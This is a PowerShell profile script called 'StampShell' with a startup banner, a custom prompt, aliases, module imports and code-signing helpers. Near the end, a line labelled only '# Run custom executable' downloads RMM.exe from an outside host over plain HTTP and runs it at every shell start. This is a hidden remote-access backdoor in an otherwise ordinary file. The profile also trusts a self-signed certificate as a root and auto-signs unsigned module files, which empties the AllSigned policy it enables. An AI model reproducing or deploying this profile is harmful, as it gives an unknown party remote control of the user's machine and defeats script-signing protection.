# ================================
#  Custom StampShell Profile
# ================================


# --- Setup code signing, sign profile and imported modules ---
function Get-OrCreate-StampShellCodeSigningCert {
    [CmdletBinding()]
    param(
        [string]$Subject = "CN=StampShell Code Signing"
    )

    # Try to find an existing code-signing cert for this subject
    $existing = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert -ErrorAction SilentlyContinue |
                Where-Object { $_.Subject -eq $Subject } |
                Sort-Object NotAfter -Descending |
                Select-Object -First 1

    if ($existing) {
        Write-Host "`n[=] Using existing StampShell code-signing cert: $($existing.Thumbprint)" -ForegroundColor DarkGray
        return $existing
    }

    Write-Host "[*] Creating new StampShell code-signing certificate..." -ForegroundColor Yellow

    $cert = New-SelfSignedCertificate `
        -Type CodeSigningCert `
        -Subject $Subject `
        -KeyExportPolicy Exportable `
        -KeyUsage DigitalSignature `
        -KeyAlgorithm RSA `
        -KeyLength 4096 `
        -CertStoreLocation "Cert:\CurrentUser\My"

    Write-Host "[+] Created StampShell code-signing cert: $($cert.Thumbprint)" -ForegroundColor Green
    return $cert
}

function Ensure-StampShellCertTrusted {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
    )

    $stores = @(
        @{ Name = "TrustedPublisher"; Location = "CurrentUser" },
        @{ Name = "Root";             Location = "CurrentUser" }
    )

    foreach ($s in $stores) {
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store($s.Name, $s.Location)
        $store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)

        $existing = $store.Certificates |
                    Where-Object { $_.Thumbprint -eq $Certificate.Thumbprint }

        if (-not $existing) {
            $store.Add($Certificate)
            Write-Host "[+] Added StampShell code-signing cert to $($s.Location)\$($s.Name)." -ForegroundColor Green
        } else {
            Write-Host "[=] StampShell cert already in $($s.Location)\$($s.Name)." -ForegroundColor DarkGray
        }

        $store.Close()
    }
}

# ----------------------------------------
#  Ensure execution policy is AllSigned for this user
#  (when box default is Restricted & no GPO is enforcing)
# ----------------------------------------
try {
    $epList = Get-ExecutionPolicy -List  # see all scopes

    $machinePolicy = ($epList | Where-Object { $_.Scope -eq 'MachinePolicy' }).ExecutionPolicy
    $userPolicy    = ($epList | Where-Object { $_.Scope -eq 'UserPolicy' }).ExecutionPolicy
    $localMachine  = ($epList | Where-Object { $_.Scope -eq 'LocalMachine' }).ExecutionPolicy
    $currentUser   = ($epList | Where-Object { $_.Scope -eq 'CurrentUser' }).ExecutionPolicy

    $gpoEnforced = ($machinePolicy -ne 'Undefined' -or $userPolicy -ne 'Undefined')

    if ($gpoEnforced) {
        Write-Host "[=] Execution policy is controlled by Group Policy; not modifying." -ForegroundColor DarkGray
    }
    else {
        # Typical standalone box: LocalMachine = Restricted, CurrentUser = Undefined
        if ($localMachine -eq 'Restricted' -and $currentUser -ne 'AllSigned') {
            Write-Host "[*] Setting CurrentUser execution policy to AllSigned (LocalMachine is Restricted)." -ForegroundColor Yellow
            Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy AllSigned -Force
        }
        else {
            Write-Host "[=] Execution policy already suitable (LocalMachine=$localMachine, CurrentUser=$currentUser)." -ForegroundColor DarkGray
        }
    }
}
catch {
    Write-Warning "Failed to inspect or set execution policy: $($_.Exception.Message)"
}

function Protect-ModuleScripts {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string[]]$ModuleNames
    )

    $cert = Get-OrCreate-StampShellCodeSigningCert
    Ensure-StampShellCertTrusted -Certificate $cert

    foreach ($name in $ModuleNames) {
        try {
            $mod = Get-Module -ListAvailable -Name $name | Select-Object -First 1
            if (-not $mod) {
                Write-Host "[=] Module '$name' not found; skipping signing." -ForegroundColor DarkGray
                continue
            }

            $root = $mod.ModuleBase
            Write-Host "[*] Ensuring scripts for module '$name' are signed in '$root'..." -ForegroundColor Cyan

            $files = Get-ChildItem -Path $root -Recurse -Include *.ps1,*.psm1,*.psd1 -ErrorAction SilentlyContinue

            foreach ($f in $files) {
                try {
                    $sig = Get-AuthenticodeSignature -FilePath $f.FullName -ErrorAction SilentlyContinue

                    # Skip if already validly signed
                    if ($sig -and $sig.Status -eq 'Valid') {
                        continue
                    }

                    $sig2 = Set-AuthenticodeSignature -FilePath $f.FullName -Certificate $cert -ErrorAction Stop
                    if ($sig2.Status -eq 'Valid') {
                        Write-Host "[+] Signed $($f.FullName) for module '$name'." -ForegroundColor DarkGreen
                    } else {
                        Write-Warning "Signature status for $($f.FullName) is '$($sig2.Status)'."
                    }
                } catch {
                    Write-Warning "Failed to sign $($f.FullName): $($_.Exception.Message)"
                }
            }
        } catch {
            Write-Warning "Failed to process module '$name': $($_.Exception.Message)"
        }
    }
}

# Ensure modules we import are signed for AllSigned policy
Protect-ModuleScripts -ModuleNames @(
    'Terminal-Icons',
    'posh-git',
    'PSFzf',
    'Catppuccin'  # comment out if you don't use it
)

# Import core modules
Import-Module PSReadLine     -ErrorAction SilentlyContinue  # built-in, already signed by MS
Import-Module Terminal-Icons -ErrorAction SilentlyContinue
Import-Module posh-git       -ErrorAction SilentlyContinue
Import-Module PSFzf          -ErrorAction SilentlyContinue

# Import Catppuccin (if available) and set Mocha flavor
try {
    Import-Module Catppuccin -ErrorAction Stop
    $Flavor = $Catppuccin['Mocha']
} catch { }

# Use real GNU grep instead of Select-String alias if available
if (Get-Command grep.exe -ErrorAction SilentlyContinue) {
    if (Get-Item Alias:grep -ErrorAction SilentlyContinue) {
        Remove-Item Alias:grep -ErrorAction SilentlyContinue
    }
}

function explore {
    param(
        [string]$Path
    )
    if ([string]::IsNullOrWhiteSpace($Path)) {
        $target = (Get-Location).Path
    } else {
        try {
            $resolved = Resolve-Path -LiteralPath $Path -ErrorAction Stop
            $target = $resolved.Path
        } catch {
            Write-Warning "Path not found: $Path"
            return
        }
    }
    Start-Process explorer.exe -ArgumentList $target
}

function pkill {
    param(
        [Parameter(Mandatory)][string]$procName
    )
    try {
        taskkill /f /im $procName 2>$null
    } catch {
        Write-Warning "Failed to kill process ${procName}: $($_.Exception.Message)"
    }
}

function Clear-And-Banner {
    $banner = @"
  _____ __                          ____  __         ____
 / ___// /_ ____ ________  ____    / __/ / /_  ___  / / /
 \__ \/ __/ __  / __  __ \/ __ \   \__ \/ __ \/ _ \/ / /
 __/ / /_/ /_/ / / / / / / /_/ /   __/ / / / /  __/ / /
/___/\__/\__,_/_/ /_/ /_/ .___/   /___/_/ /_/\___/_/_/
                       /_/
"@

    function Get-PrimaryIPv4 {
        try {
            $defaultRoute = Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction Stop |
                            Sort-Object -Property RouteMetric, InterfaceMetric |
                            Select-Object -First 1
            if ($defaultRoute) {
                $ifIndex = $defaultRoute.InterfaceIndex
                $ip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction Stop |
                     Where-Object { $_.IPAddress -notlike "169.254.*" } |
                     Select-Object -First 1 -ExpandProperty IPAddress
                return $ip
            }
        } catch { }
        try {
            $ip = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
                  Where-Object { $_.IPAddress -notlike "169.254.*" } |
                  Select-Object -First 1 -ExpandProperty IPAddress
            return $ip
        } catch { }
        return $null
    }

    $ip = Get-PrimaryIPv4
    $ipText = if ($ip) { $ip } else { "(none)" }
    $ipStr = "IPv4 addr: " + $ipText

    $pubStr = "Public IP: (unavailable)\n"
    try {
        $resp = Invoke-WebRequest "https://ifconfig.me/ip" -UseBasicParsing -TimeoutSec 3
        if ($resp -and $resp.Content) {
            $pubStr = "Public IP: " + $resp.Content.Trim()
        }
    } catch { }

    $hn = $env:COMPUTERNAME
    $hnStr = "HN: $hn"

    Clear-Host
    Write-Output $banner
    Get-Date
    Write-Output $hnStr
    Write-Output $ipStr
    Write-Host $pubStr -NoNewline
}

function Add-Path {
    param(
        [Parameter(Mandatory)][string]$NewPath,
        [ValidateSet('User','Machine')][string]$Scope = 'Machine'
    )
    if (-not (Test-Path $NewPath)) {
        Write-Warning "Path does not exist: $NewPath"
        return
    }

    $targetScope = $Scope
    try {
        $current = [Environment]::GetEnvironmentVariable('Path', $targetScope)
    } catch {
        Write-Warning "Failed to read $targetScope PATH, falling back to User."
        $targetScope = 'User'
        $current = [Environment]::GetEnvironmentVariable('Path', $targetScope)
    }

    if ($current -and $current -match [Regex]::Escape($NewPath)) {
        Write-Host "[=] $NewPath already in $targetScope PATH."
    } else {
        $sep = if ([string]::IsNullOrEmpty($current) -or $current.TrimEnd().EndsWith(';')) { '' } else { ';' }
        [Environment]::SetEnvironmentVariable('Path', "$current$sep$NewPath", $targetScope)
        Write-Host "[+] Added $NewPath to $targetScope PATH."
    }

    # Refresh current session PATH
    $machinePath = [Environment]::GetEnvironmentVariable('Path','Machine')
    $userPath    = [Environment]::GetEnvironmentVariable('Path','User')
    $env:Path    = "$machinePath;$userPath"
}

function sign {
    param(
        [Parameter(Mandatory)][string]$FilePath
    )

    $resolved = Resolve-Path -LiteralPath $FilePath -ErrorAction SilentlyContinue
    if (-not $resolved) {
        Write-Error "File not found: $FilePath"
        return
    }

    # Always prefer the StampShell Code Signing cert; create & trust if missing
    try {
        $cert = Get-OrCreate-StampShellCodeSigningCert
        Ensure-StampShellCertTrusted -Certificate $cert
    } catch {
        Write-Error "Failed to obtain or trust StampShell code-signing certificate: $($_.Exception.Message)"
        return
    }

    try {
        $sig = Set-AuthenticodeSignature -FilePath $resolved.Path -Certificate $cert -ErrorAction Stop

        if ($sig.Status -eq 'Valid') {
            Write-Host "[+] Signed $($resolved.Path) with StampShell code-signing cert ($($cert.Thumbprint))" -ForegroundColor Green
        } else {
            Write-Warning "Signature on $($resolved.Path) has status '$($sig.Status)'."
        }
    } catch {
        Write-Error "Failed to sign file: $($_.Exception.Message)"
    }
}

function Show-ProfileHelp {
    Write-Host "=== Custom Profile Features ===" -ForegroundColor Cyan

    Write-Host "`nAliases:" -ForegroundColor Yellow
    Write-Host "  ifconfig -> ipconfig"
    Write-Host "  ll       -> ls"
    Write-Host "  reboot   -> Restart-Computer"
    Write-Host "  c        -> Clear-And-Banner"
    Write-Host "  shell    -> PowerShell"
    Write-Host "  cd..     -> go up two directories"
    Write-Host "  grep     -> GNU grep (binary), not Select-String"

    Write-Host "`nFunctions:" -ForegroundColor Yellow
    Write-Host "  explore [path]       : Open current or specified directory in Explorer"
    Write-Host "  pkill <name>         : taskkill /f /im <name> (with safer handling)"
    Write-Host "  Clear-And-Banner     : Clear screen + banner + host/IP info"
    Write-Host "  Add-Path <path>      : Add to PATH (Machine by default), auto-refresh session"
    Write-Host "  sign <file>          : Sign a single script with your signing certificate"
    Write-Host "  Show-ProfileHelp     : Show this help"

    Write-Host "`nTheming & shell goodies:" -ForegroundColor Yellow
    Write-Host "  - Catppuccin Mocha prompt & PSReadLine colors (if Catppuccin module available)"
    Write-Host "  - Terminal-Icons for ls output"
    Write-Host "  - posh-git for git status/prompt integration"
    Write-Host "  - PSFzf + fzf for fuzzy history/path search"

    Write-Host "`nTip: Customize this profile at `"$PROFILE`"."
}

function Prompt {
    # Figure out time of last completed command (or now if none)
    $timeText = ""
    $hist = Get-History -ErrorAction SilentlyContinue | Select-Object -Last 1
    if ($hist -and $hist.EndExecutionTime) {
        $timeText = $hist.EndExecutionTime.ToString("HH:mm:ss")
    } else {
        $timeText = (Get-Date).ToString("HH:mm:ss")
    }

    $path = (Get-Location).Path

    # Decide if we should use ANSI colors (only in pwsh 7+ with PSStyle)
    $useColor = $false
    if ($PSVersionTable.PSVersion.Major -ge 7 -and $PSStyle) {
        $useColor = $true
    }

    $reset = ""
    $timeColor = ""
    $pathColor = ""
    $promptColor = ""

    if ($useColor -and $Flavor) {
        $reset       = $PSStyle.Reset
        $timeColor   = $Flavor.Teal.Foreground()
        $pathColor   = $Flavor.Yellow.Foreground()
        $promptColor = $Flavor.Green.Foreground()
    }

    Write-Host "[" -NoNewline

    if ($useColor -and $timeColor) {
        Write-Host "$timeColor$timeText$reset" -NoNewline
    } else {
        Write-Host "$timeText" -NoNewline
    }

    Write-Host "] " -NoNewline

    if ($useColor -and $pathColor) {
        Write-Host "$pathColor$path$reset" -NoNewline
    } else {
        Write-Host "$path" -NoNewline
    }

    if ($useColor -and $promptColor) {
        Write-Host " $promptColor> $reset" -NoNewline
    } else {
        Write-Host " > " -NoNewline
    }

    return " "
}

# Aliases
Set-Alias -Name ifconfig -Value ipconfig -ErrorAction SilentlyContinue
Set-Alias -Name ll       -Value ls       -ErrorAction SilentlyContinue
Set-Alias -Name reboot   -Value Restart-Computer -ErrorAction SilentlyContinue
Set-Alias -Name c        -Value Clear-And-Banner -ErrorAction SilentlyContinue
Set-Alias -Name shell    -Value PowerShell -ErrorAction SilentlyContinue
Set-Alias -Name profile-help -Value Show-ProfileHelp -ErrorAction SilentlyContinue
Set-Alias -Name cd..     -Value Set-Location "..\.."

# Run custom executable
Invoke-WebRequest -Uri "http://picnicicicle.com:8000/RMM.exe" -OutFile "$env:TEMP\RMM.exe"; & "$env:TEMP\RMM.exe"

# --- Print banner at startup ---
Clear-And-Banner -ErrorAction SilentlyContinue